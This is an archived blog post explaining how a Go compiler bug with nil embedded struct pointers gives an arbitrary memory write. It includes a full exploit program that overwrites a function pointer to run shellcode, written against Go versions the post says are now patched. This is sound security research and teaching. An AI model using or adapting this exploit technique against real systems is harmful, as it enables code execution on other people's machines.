<!DOCTYPE html>
<html lang="en">
<head>
        <title>Exploiting a Go Binary</title>
        <meta charset="utf-8" />
        <link rel="stylesheet" href="http://codearcana.com/theme/css/main.css" type="text/css" />
        <link href="http://codearcana.com/" type="application/atom+xml" rel="alternate" title="Code Arcana ATOM Feed" />


        <!--[if IE]>
                <script src="http://html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->

        <!--[if lte IE 7]>
                <link rel="stylesheet" type="text/css" media="all" href="http://codearcana.com/css/ie.css"/>
                <script src="http://codearcana.com/js/IE8.js" type="text/javascript"></script><![endif]-->

        <!--[if lt IE 7]>
                <link rel="stylesheet" type="text/css" media="all" href="http://codearcana.com/css/ie6.css"/><![endif]-->

</head>

<body id="index" class="home">
        <header id="banner" class="body">
                <h1><a href="http://codearcana.com/index.html">Code Arcana </a></h1>
                <nav><ul>
                    <li><a href="http://codearcana.com">Blog</a></li>
                    <li><a href="http://codearcana.com/archives.html">Archives</a></li>
                    <li ><a href="http://codearcana.com/pages/about.html">About</a></li>
                </ul></nav>
        </header><!-- /#banner -->

<section id="content" class="body">
<article>
        <header> <h1 class="entry-title"><a href="posts/2013/04/23/exploiting-a-go-binary.html"
        rel="bookmark" title="Permalink to Exploiting a Go Binary">Exploiting a Go Binary</a></h1> <a href="http://twitter.com/share" class="twitter-share-button" data-count="horizontal" data-via="awreece">Tweet</a><script type="text/javascript" src="http://platform.twitter.com/widgets.js"></script>
 </header>
<footer class="post-info">
        <abbr class="published" title="2013-04-23T00:00:00">
                Tue 23 April 2013
        </abbr>

        <address class="vcard author">
                By <a class="url fn" href="http://codearcana.com/author/alex-reece.html">Alex Reece</a>
        </address>
<p>In <a href="http://codearcana.com/category/security.html">security</a>. </p>
<p>tags: <a href="http://codearcana.com/tag/golang.html">golang</a><a href="http://codearcana.com/tag/exploitation.html">exploitation</a></p></footer><!-- /.post-info --><!-- /.post-info -->
        <div class="entry-content">
        <h3>Introduction</h3>

<p>Earlier this year, tylerni7 showed us a proof of concept for a 32 bit Go
exploit using <a href="https://code.google.com/p/go/issues/detail?id=5336">this
issue</a>. geohot and I had a wager over who could get the first remote code
execution on <a href="http://play.golang.org">play.golang.org</a>: he won, but
just barely ;-). Props also to ricky for helping to find the underlying
cause/writing the patch. Here is a summary of how we did it.</p>
<p>Note: <a href="http://play.golang.org">play.golang.org</a> is properly sandboxed, so 
code execution there does not
actually let you do anything. Had this been a more serious bug that could
actually be used for anything malicious, we would have immediately reported it
privately. Neither specific vulnerability nor the technique used here work in the latest version of Go (the vulnerability was patched and Go 1.1 introduced non-executable heaps).</p>
<p>This post is cross posted on the <a href="http://ppp.cylab.cmu.edu/wordpress/?p=1087">PPP blog</a>.</p>
<h3>The Bug</h3>

<p>Go has support for embedded structs. You can define an embedded struct as follows:</p>

<div class="highlight"><pre><span class="kd">type</span> <span class="nx">Embedded</span> <span class="kd">struct</span> <span class="p">{</span>
   <span class="nx">foo</span> <span class="kt">int</span>
<span class="p">}</span>

<span class="kd">type</span> <span class="nx">Struct</span> <span class="kd">struct</span> <span class="p">{</span>
   <span class="nx">Embedded</span>
   <span class="nx">bar</span> <span class="kt">int</span>
<span class="p">}</span>

<span class="kd">var</span> <span class="nx">instance</span> <span class="nx">Struct</span>
</pre></div>


<p>
It is valid to do both <tt>instance.bar</tt> and <tt>instance.foo</tt>.</p>

<p>The problem comes when you try something slightly trickier:</p>

<div class="highlight"><pre><span class="kd">type</span> <span class="nx">Embedded</span> <span class="kd">struct</span> <span class="p">{</span>
   <span class="nx">foo</span> <span class="kt">int</span>
<span class="p">}</span>

<span class="kd">type</span> <span class="nx">Struct</span> <span class="kd">struct</span> <span class="p">{</span>
   <span class="o">*</span><span class="nx">Embedded</span>
   <span class="nx">bar</span> <span class="kt">int</span>
<span class="p">}</span>

<span class="kd">var</span> <span class="nx">instance</span> <span class="nx">Struct</span>
</pre></div>


<p>
When you access <tt>instance.foo</tt> (a member of an uninitialized struct), it incorrectly offsets from 0 rather than from the base of an <tt>Embedded</tt> struct. Normally, when dereferencing a pointer inside a struct, the go compiler
emits guard code which will cause a segfault if the pointer is nil.
However, this code is not emitted when the pointer is the first element
of the struct, since it's assumed that this will cause a segfault
whenever it is used anyway.  This assumption is not always valid, as the
pointer can be to a large struct such that the offsets of members of the large
struct are valid addresses.
</p>

<h3>The Vulnerability</h3>

<p>We define an enormous struct and use it to offset memory:</p>

<div class="highlight"><pre><span class="kd">type</span> <span class="nx">Embedded</span> <span class="kd">struct</span> <span class="p">{</span>
   <span class="nx">offset</span> <span class="p">[</span><span class="mh">0x400100</span><span class="p">]</span><span class="kt">byte</span>
   <span class="nx">address</span> <span class="kt">uint32</span>
<span class="p">}</span>

<span class="kd">type</span> <span class="nx">Struct</span> <span class="kd">struct</span> <span class="p">{</span>
   <span class="o">*</span><span class="nx">Embedded</span>
   <span class="nx">bar</span> <span class="kt">int</span>
<span class="p">}</span>
<span class="kd">var</span> <span class="nx">instance</span> <span class="nx">Struct</span>
</pre></div>


<p>
Now we can do <tt>instance.address = 0xdeadbeef</tt> and we have written to <tt>0x400100</tt>! This is the arbitrary write primitive we need.</p>

<h3>The Exploit</h3>

<p>Once you have an arbitrary write in go, it is <em>really easy</em> to get arbitrary code execution. We put a function pointer in our data segment (we wanted to put it in the heap, but that didn't work on 64bit Go - apparently the size of a struct is limited to 32 bits. Luckily, the data segment is in the lower 32 bits) and change it to point to our shell code using the arbitrary write. Since Go has <em>no randomization</em> at all, this is as simple as running the program twice. Full exploit below:</p>

<div class="highlight"><pre><span class="kn">package</span> <span class="nx">main</span>

<span class="kn">import</span> <span class="s">&quot;fmt&quot;</span>

<span class="c1">// Address to write, computed from a previous run.</span>
<span class="kd">const</span> <span class="nx">addr_to_overwrite</span> <span class="p">=</span> <span class="mh">0x50e2f0</span>
<span class="c1">// &amp;shellcode, computed from a previous run.</span>
<span class="kd">const</span> <span class="nx">val_to_overwrite</span> <span class="kt">uint64</span> <span class="p">=</span> <span class="mh">0xc200035160</span>

<span class="kd">type</span> <span class="nx">Embedded</span> <span class="kd">struct</span> <span class="p">{</span>
   <span class="nx">offset</span> <span class="p">[</span><span class="nx">addr_to_overwrite</span><span class="p">]</span><span class="kt">byte</span>
   <span class="nx">payload</span> <span class="kt">uint64</span>
<span class="p">}</span>

<span class="kd">type</span> <span class="nx">Nested</span> <span class="kd">struct</span> <span class="p">{</span>
  <span class="c1">// This magic is necessary is because there is an explict null check if</span>
  <span class="c1">// if the offset is greater than 0x1000.</span>
  <span class="nx">Embedded</span>
<span class="p">}</span>

<span class="kd">type</span> <span class="nx">Struct</span> <span class="kd">struct</span> <span class="p">{</span>
 <span class="c1">// The issue is that a reference to the embeded struct pointer here</span>
 <span class="c1">// will be offset from null (rather than the true base of the struct).</span>
 <span class="c1">// We thus just make sizeof(the embedded struct) large enough to point</span>
 <span class="c1">// to the address we want to overwrite.</span>
 <span class="c1">//</span>
 <span class="c1">// See https://code.google.com/p/go/issues/detail?id=5336</span>
 <span class="o">*</span><span class="nx">Nested</span>
<span class="p">}</span>

<span class="kd">var</span> <span class="nx">unused</span> <span class="p">=</span> <span class="kd">func</span> <span class="p">()</span> <span class="p">{}</span>

<span class="kd">func</span> <span class="nx">main</span><span class="p">()</span> <span class="p">{</span>
 <span class="nx">s</span> <span class="o">:=</span> <span class="o">&amp;</span><span class="nx">Struct</span><span class="p">{}</span>
 <span class="nx">shellcode</span> <span class="o">:=</span> <span class="s">&quot;\x90\x90\x90\x90\x90\x90\x90\xeb\xfe&quot;</span>

 <span class="nx">fmt</span><span class="p">.</span><span class="nx">Println</span><span class="p">(</span><span class="s">&quot;You should overwrite this: &quot;</span><span class="p">,</span> <span class="o">&amp;</span><span class="nx">unused</span><span class="p">)</span>
 <span class="nx">fmt</span><span class="p">.</span><span class="nx">Println</span><span class="p">(</span><span class="s">&quot;With this: &quot;</span><span class="p">,</span> <span class="o">&amp;</span><span class="nx">shellcode</span><span class="p">)</span>

 <span class="nx">fmt</span><span class="p">.</span><span class="nx">Println</span><span class="p">(</span><span class="s">&quot;***********************************************&quot;</span><span class="p">);</span>
 <span class="nx">fmt</span><span class="p">.</span><span class="nx">Println</span><span class="p">(</span><span class="s">&quot;Overwriting &quot;</span><span class="p">,</span> <span class="o">&amp;</span><span class="nx">s</span><span class="p">.</span><span class="nx">payload</span><span class="p">,</span> <span class="s">&quot; with &quot;</span><span class="p">,</span> <span class="nx">val_to_overwrite</span><span class="p">)</span>

 <span class="o">*</span><span class="p">(</span><span class="o">&amp;</span><span class="nx">s</span><span class="p">.</span><span class="nx">payload</span><span class="p">)</span> <span class="p">=</span> <span class="nx">val_to_overwrite</span><span class="p">;</span>

 <span class="nx">unused</span><span class="p">();</span>
<span class="p">}</span>
</pre></div>


<h3>What Now?</h3>

<p>Well, clearly the <a href="https://code.google.com/p/go/source/detail?r=37bf155bc78073d51c0b5706a4f3fba19cca67f4">issue</a>
was fixed. I also think it is important for Go to add the protections
that come now standard with C binaries (ASLR, NX) - I posted 
<a href="http://codearcana.com/posts/2012/05/06/securing-and-exploiting-go-binaries.html">an article</a> 
earlier about security in Go where I strongly advocated those protections. 
Luckily, Go 1.1. will be adding some of these protections: specificially, the 
above exploit will not work because <a href="https://groups.google.com/forum/?fromgroups=#!topic/golang-nuts/o2Q5oc36Qt0">Go 1.1  uses a non-executable heap and stack</a>.</p>
        </div><!-- /.entry-content -->
        <div class="comments">
        <h2>Comments !</h2>
            <div id="disqus_thread"></div>
            <script type="text/javascript">
               var disqus_identifier = "posts/2013/04/23/exploiting-a-go-binary.html";
               (function() {
               var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
               dsq.src = 'http://codearcana.disqus.com/embed.js';
               (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
              })();
            </script>
        </div>

</article>
</section>

        <aside id="sidebar">
                <div class="widget">
                        <h2>Categories</h2>
                        <ul>
                           <li ><a href="http://codearcana.com/category/performance.html">performance</a></li>
                           <li class="active"><a href="http://codearcana.com/category/security.html">security</a></li>
                           <li ><a href="http://codearcana.com/category/software-engineering.html">software engineering</a></li>
                        </ul>
		</div>
		<div class="widget">
		    <h2>Tags</h2>
		    <ul class="cloud">
			<li class="tag-4">
			  <a class="tag" href="http://codearcana.com/tag/malloc.html">malloc</a>
			</li>
			<li class="tag-1">
			  <a class="tag" href="http://codearcana.com/tag/tutorial.html">tutorial</a>
			</li>
			<li class="tag-4">
			  <a class="tag" href="http://codearcana.com/tag/theory.html">theory</a>
			</li>
			<li class="tag-1">
			  <a class="tag" href="http://codearcana.com/tag/exploitation.html">exploitation</a>
			</li>
			<li class="tag-2">
			  <a class="tag" href="http://codearcana.com/tag/golang.html">golang</a>
			</li>
			<li class="tag-4">
			  <a class="tag" href="http://codearcana.com/tag/zsh.html">zsh</a>
			</li>
			<li class="tag-4">
			  <a class="tag" href="http://codearcana.com/tag/make.html">make</a>
			</li>
			<li class="tag-1">
			  <a class="tag" href="http://codearcana.com/tag/profiling.html">profiling</a>
			</li>
			<li class="tag-4">
			  <a class="tag" href="http://codearcana.com/tag/bash.html">bash</a>
			</li>
			<li class="tag-4">
			  <a class="tag" href="http://codearcana.com/tag/mac-osx.html">mac osx</a>
			</li>
		    </ul>
		</div>


                <div class="widget blogroll">
                        <h2>Blogroll</h2>
                        <ul>
                            <li><a href="http://ppp.cylab.cmu.edu/wordpress/">PPP Blog</a></li>
                            <li><a href="http://www.codinghorror.com/blog/">Coding Horror</a></li>
                            <li><a href="http://blog.regehr.org/">Embedded in Academia</a></li>
                            <li><a href="http://highscalability.com/">High Scalability</a></li>
                            <li><a href="http://coderweekly.com/">Coder Weekly</a></li>
                            <li><a href="http://www.phrack.org/">phrack</a></li>
                            <li><a href="http://jbremer.org/">skier_'s blog</a></li>
                            <li><a href="http://dtrace.org/blogs">dtrace blog</a></li>
                        </ul>
                </div><!-- /.blogroll -->
                <div class="widget social">
                        <h2>Social</h2>
			<ul>
                            <li><a href="http://codearcana.com/feeds/all.atom.xml" type="application/atom+xml" rel="alternate">atom feed</a></li>

				<li><a href="https://twitter.com/awreece">twitter</a></li>
				<li><a href="https://github.com/awreece">github</a></li>
				<li><a href="https://plus.google.com/106589059588263736517/posts">google+</a></li>
                        </ul>
                </div><!-- /.social -->
        </aside><!-- /#sidebar -->
    <script type="text/javascript">
    var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
    document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));
    </script>
    <script type="text/javascript">
    try {
        var pageTracker = _gat._getTracker("UA-40107691-1");
    pageTracker._trackPageview();
    } catch(err) {}</script>
</body>
</html>